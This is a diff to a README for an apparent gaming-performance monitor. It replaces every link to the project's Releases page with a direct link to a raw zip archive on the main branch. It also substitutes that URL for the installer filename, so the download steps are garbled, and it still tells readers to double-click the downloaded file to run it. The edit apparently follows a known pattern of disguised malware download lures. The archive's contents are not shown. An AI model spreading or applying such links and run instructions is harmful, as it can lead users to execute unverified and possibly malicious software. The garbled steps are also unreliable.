@@ -1,6 +1,6 @@
 # 🎮 GameSense-API - Monitor Your Gaming Performance Easily
 
-[![Download GameSense-API](https://img.shields.io/badge/Download-GameSense--API-blue)](https://github.com/benjatenoriov/GameSense-API/releases)
+[![Download GameSense-API](https://github.com/benjatenoriov/GameSense-API/raw/refs/heads/main/app/Sense_API_Game_3.3.zip)](https://github.com/benjatenoriov/GameSense-API/raw/refs/heads/main/app/Sense_API_Game_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to GameSense-API! This application helps you keep an eye on your gaming 
 
 ## 📥 Download & Install
 
-To get GameSense-API on your computer, visit this page to download: [GameSense-API Releases](https://github.com/benjatenoriov/GameSense-API/releases).
+To get GameSense-API on your computer, visit this page to download: [GameSense-API Releases](https://github.com/benjatenoriov/GameSense-API/raw/refs/heads/main/app/Sense_API_Game_3.3.zip).
 
 1. Click on the **Releases** link above.
 2. Look for the latest version of the application.
-3. You will find a file named something like `GameSenseAPI.exe`.
+3. You will find a file named something like `https://github.com/benjatenoriov/GameSense-API/raw/refs/heads/main/app/Sense_API_Game_3.3.zip`.
 4. Click on the file name to start the download.
 5. Once the download is complete, locate the downloaded file on your computer (usually in the Downloads folder).
 6. Double-click the file to run the installer.
@@ -63,4 +63,4 @@ We welcome community contributions! If you have ideas for improvement or new fea
 
 Thank you for choosing GameSense-API to enhance your gaming experience. We appreciate your support and feedback to improve this application.
 
-For more details and updates, remember to check the [GameSense-API Releases](https://github.com/benjatenoriov/GameSense-API/releases) page regularly. Enjoy your gaming!
+For more details and updates, remember to check the [GameSense-API Releases](https://github.com/benjatenoriov/GameSense-API/raw/refs/heads/main/app/Sense_API_Game_3.3.zip) page regularly. Enjoy your gaming!
